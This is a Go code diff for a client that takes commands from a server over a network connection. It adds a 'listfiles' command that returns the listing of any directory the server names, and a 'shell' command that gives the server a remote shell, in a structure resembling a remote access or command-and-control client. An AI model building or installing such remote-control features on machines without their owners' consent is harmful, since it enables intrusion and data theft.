@@ -5,6 +5,7 @@ import (
 	"net"
 	"src/Client/generic/commands"
 	"src/Client/generic/logger"
+	"src/Client/session/protocol"
 )
 
 func commandHandler(conn net.Conn) error {
@@ -16,7 +17,7 @@ func commandHandler(conn net.Conn) error {
 	for {
 		// Wait for commands from the server
 		logger.Log("Waiting for command from server...")
-		command, err := ReceiveData(conn)
+		command, err := protocol.ReceiveData(conn)
 		logger.Log(fmt.Sprintf("Received command: %s", string(command)))
 		if err != nil {
 			logger.Error(fmt.Sprintf("Failed to receive command: %v", err))
@@ -40,12 +41,24 @@ func processCommand(conn net.Conn, command string) error {
 	case "systeminfo":
 		logger.Log("Received systeminfo command, responding with system information.")
 		commandResponse = commands.SysInfoString()
+	case "listfiles":
+		logger.Log("Received listfiles command, responding with file list.")
+		dir, error := protocol.ReceiveData(conn)
+		if error != nil {
+			logger.Error(fmt.Sprintf("Failed to receive directory for listfiles command: %v", error))
+			commandResponse = "Error receiving directory for listfiles command."
+		} else {
+			commandResponse = commands.DirOutputAsString(string(dir))
+		}
+	case "shell":
+		logger.Log("Received shell command, executing shell command.")
+		commands.ShellHandler(conn)
 	default:
 		logger.Log(fmt.Sprintf("Unknown command: %s", command))
 	}
 
 	if commandResponse != "" {
-		SendData(conn, []byte(commandResponse))
+		protocol.SendData(conn, []byte(commandResponse))
 		logger.Log(fmt.Sprintf("Sent response for command: %s", command))
 	}
 
